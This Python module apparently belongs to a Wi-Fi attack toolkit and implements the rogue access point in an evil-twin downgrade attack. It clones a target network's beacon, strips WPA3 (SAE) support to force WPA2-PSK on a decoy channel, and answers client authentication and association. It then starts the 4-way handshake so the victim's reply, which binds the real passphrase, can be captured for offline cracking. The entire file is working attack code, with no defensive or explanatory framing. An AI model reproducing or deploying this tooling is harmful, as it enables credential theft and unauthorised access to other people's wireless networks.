"""AP-side 802.11 response builders for the FakeAP responder (802.11 spec, no I/O).

``beacon_clone`` rewrites a captured beacon to a WPA2-only PSK twin (SAE stripped) on the decoy
channel; ``auth_resp`` / ``assoc_resp`` / ``eapol_m1`` answer auth/assoc then open the 4-way with
our ANonce so the client's M2 (its MIC binds the real PSK) is captured.
"""
import struct
from typing import Optional

from wifit3.dot11.chan import same_band
from wifit3.dot11.ie import (
    GENERIC_RSN_IE, ds_param_ie, ext_rates_ie, force_psk_akm,
    iter_information_elements, rates_ie,
)
from wifit3.dot11.eapol import data_header, eapol_key, LLC_SNAP_EAPOL
from wifit3.dot11.mac import mac_header

_CAP_ESS_PRIVACY = 0x0011
_BEACON_HEAD = 36               # 24B MAC header + 12B fixed (timestamp, interval, capability)
_CAPABILITY_OFFSET = 34
_ELEMID_SUPP_RATES = 0x01
_ELEMID_EXT_RATES = 0x32        # 50 Extended Supported Rates
_ELEMID_DS = 0x03
_ELEMID_RSN = 0x30
_ELEMID_HT_OP = 0x3D           # 61 HT Operation (primary channel + secondary-channel offset)
_ELEMID_VHT_OP = 0xC0          # 192 VHT Operation (channel width + center-frequency segments)
_ELEMID_RSNXE = 0xF4            # RSN Extended Caps: SAE hash-to-element, MFP-required advert
_ELEMID_HT_CAP = 0x2D           # 45 HT Capabilities
_ELEMID_EXT = 0xFF
_ELEMID_VENDOR = 0xDD
_WMM_OUI_TYPE = b"\x00\x50\xf2\x02"
_HT_CAP_40MHZ = 0x02            # HT Capabilities Info: Supported Channel Width Set
_SAE_H2E_ONLY_SELECTOR = 0xFB   # 0x80 | BSS membership selector 123 (SAE hash-to-element only)
_AID_FIELD_BITS = 0xC000        # 802.11: the AID field's two MSBs are set
_ELEMID_RM_ENABLED_CAP = 0x46   # 70
_ELEMID_VHT_CAP = 0xBF          # 191
_ELEMID_EXT_CAP = 0x7F          # 127 Extended Capabilities
_EXTID_HE_CAP = 35
_EXTID_HE_OP = 36
_EXTID_BSS_COLOR_CCA = 42
_EXTID_SPATIAL_REUSE = 39
_EXTID_MU_EDCA = 38
_EXTID_EHT_CAP = 108
_EXTID_EHT_OP = 106
# (Element ID, Element ID Extension) a (re)assoc response copies from the twin beacon, in hostapd's
# send_assoc_resp order.
_ASSOC_RESP_ELEMENTS = (
    (_ELEMID_SUPP_RATES, None), (_ELEMID_EXT_RATES, None), (_ELEMID_RM_ENABLED_CAP, None),
    (_ELEMID_HT_CAP, None), (_ELEMID_HT_OP, None),
    (_ELEMID_VHT_CAP, None), (_ELEMID_VHT_OP, None),
    (_ELEMID_EXT, _EXTID_HE_CAP), (_ELEMID_EXT, _EXTID_HE_OP), (_ELEMID_EXT, _EXTID_BSS_COLOR_CCA),
    (_ELEMID_EXT, _EXTID_SPATIAL_REUSE), (_ELEMID_EXT, _EXTID_MU_EDCA), (_ELEMID_EXT_CAP, None),
    (_ELEMID_EXT, _EXTID_EHT_CAP), (_ELEMID_EXT, _EXTID_EHT_OP),
)
_M1_KEY_INFO = 0x008A          # Pairwise + Key ACK + key descriptor version 2 (HMAC-SHA1, PSK)
_CCMP_KEY_LEN = 16


def _resp_header(fc: bytes, bssid: bytes, client: bytes) -> bytes:
    return mac_header(fc, client, bssid, bssid)


def auth_resp(bssid: bytes, client: bytes, algorithm: int = 0, status: int = 0) -> bytes:
    """Authentication response: ``algorithm``, sequence 2, ``status``."""
    return _resp_header(b"\xb0\x00", bssid, client) + struct.pack("<HHH", algorithm, 2, status)


def assoc_resp(bssid: bytes, client: bytes, aid: int = 1, channel: int = 1, status: int = 0,
               reassoc: bool = False, twin_beacon: bytes = b"") -> bytes:
    """(Re)Association Response: ``twin_beacon``'s capability (+ESS+Privacy), ``status``, AID, then
    its rates and HT/VHT/HE/EHT/WMM elements; band-aware rates for ``channel`` if it has none."""
    capability = _CAP_ESS_PRIVACY
    if len(twin_beacon) >= _BEACON_HEAD:
        capability |= struct.unpack_from("<H", twin_beacon, _CAPABILITY_OFFSET)[0]
    body = (struct.pack("<HHH", capability, status, aid | _AID_FIELD_BITS)
            + _assoc_resp_elements(twin_beacon, channel))
    return _resp_header(b"\x30\x00" if reassoc else b"\x10\x00", bssid, client) + body


def _assoc_resp_elements(twin_beacon: bytes, channel: int) -> bytes:
    found: dict[tuple[int, Optional[int]], bytes] = {}
    wmm = b""
    for tag_id, body, elem in iter_information_elements(twin_beacon, _BEACON_HEAD):
        if tag_id == _ELEMID_VENDOR and body[:4] == _WMM_OUI_TYPE:
            wmm = elem
        elif tag_id == _ELEMID_EXT and body:
            found[(tag_id, body[0])] = elem
        else:
            found[(tag_id, None)] = elem
    if (_ELEMID_SUPP_RATES, None) not in found and (_ELEMID_EXT_RATES, None) not in found:
        found[(_ELEMID_SUPP_RATES, None)] = rates_ie(channel)
        found[(_ELEMID_EXT_RATES, None)] = ext_rates_ie(channel)
    return b"".join(found.get(key, b"") for key in _ASSOC_RESP_ELEMENTS) + wmm


def eapol_m1(bssid: bytes, client: bytes, anonce: bytes, replay: int = 1) -> bytes:
    """4-way message 1 (AP->client): our ANonce, no MIC."""
    payload = eapol_key(key_info=_M1_KEY_INFO, key_len=_CCMP_KEY_LEN, replay=replay, nonce=anonce)
    return data_header(to_ds=False, bssid=bssid, client=client) + LLC_SNAP_EAPOL + payload


def _ht_op_to_channel(elem: bytes, channel: int) -> bytes:
    body = bytearray(elem[2:])
    if len(body) >= 2:
        body[0] = channel & 0xFF          # primary channel
        body[1] &= ~0x07                  # clear secondary-offset (bits 0-1) + STA width (bit 2)
    return elem[:2] + bytes(body)


def _vht_op_to_20mhz(elem: bytes) -> bytes:
    body = bytearray(elem[2:])
    if len(body) >= 3:
        body[0] = 0                       # channel width 0 = 20/40 MHz
        body[1] = 0                       # center-freq seg 0
        body[2] = 0                       # center-freq seg 1
    return elem[:2] + bytes(body)


def _ht_cap_to_20mhz(elem: bytes) -> bytes:
    if len(elem) < 3:
        return elem
    return elem[:2] + bytes([elem[2] & ~_HT_CAP_40MHZ & 0xFF]) + elem[3:]


def _without_sae_h2e_selector(elem: bytes) -> bytes:
    rates = bytes(rate for rate in elem[2:] if rate != _SAE_H2E_ONLY_SELECTOR)
    return bytes([elem[0], len(rates)]) + rates if rates else b""


def _beacon_channel(tags: bytes) -> Optional[int]:
    ht_op_primary = None
    for tag_id, body, _elem in iter_information_elements(tags):
        if tag_id == _ELEMID_DS and body:
            return body[0]
        if tag_id == _ELEMID_HT_OP and body and ht_op_primary is None:
            ht_op_primary = body[0]
    return ht_op_primary


def beacon_clone(real_beacon: bytes, decoy_channel: int, bssid: Optional[bytes] = None) -> bytes:
    """The target's beacon rewritten to a 20 MHz WPA2-PSK twin. ``bssid`` rewrites Addr2/Addr3.
    Rates are the target's, or generic ones for ``decoy_channel`` when it is on the other band."""
    if len(real_beacon) < _BEACON_HEAD:
        raise ValueError(f"beacon too short to rewrite: {len(real_beacon)} bytes")
    head = bytearray(real_beacon[:_BEACON_HEAD])
    head[22:24] = b"\x00\x00"
    if bssid is not None:
        head[10:16] = bssid          # Addr2 (SA)
        head[16:22] = bssid          # Addr3 (BSSID)
    tags = real_beacon[_BEACON_HEAD:]
    real_channel = _beacon_channel(tags)
    cross_band = real_channel is not None and not same_band(real_channel, decoy_channel)
    has_ext_rates = any(tag_id == _ELEMID_EXT_RATES
                        for tag_id, _body, _elem in iter_information_elements(tags))
    kept = bytearray()
    for tag_id, _body, elem in iter_information_elements(tags):
        if tag_id == _ELEMID_SUPP_RATES and cross_band:
            kept += rates_ie(decoy_channel) + (b"" if has_ext_rates else ext_rates_ie(decoy_channel))
        elif tag_id == _ELEMID_EXT_RATES and cross_band:
            kept += ext_rates_ie(decoy_channel)
        elif tag_id in (_ELEMID_SUPP_RATES, _ELEMID_EXT_RATES):
            kept += _without_sae_h2e_selector(elem)
        elif tag_id == _ELEMID_HT_CAP:
            kept += _ht_cap_to_20mhz(elem)
        elif tag_id == _ELEMID_RSN:
            kept += force_psk_akm(elem) or GENERIC_RSN_IE
        elif tag_id == _ELEMID_DS:
            kept += ds_param_ie(decoy_channel)
        elif tag_id == _ELEMID_HT_OP:
            kept += _ht_op_to_channel(elem, decoy_channel)
        elif tag_id == _ELEMID_VHT_OP:
            kept += _vht_op_to_20mhz(elem)
        elif tag_id != _ELEMID_RSNXE:
            kept += elem
    return bytes(head) + bytes(kept)
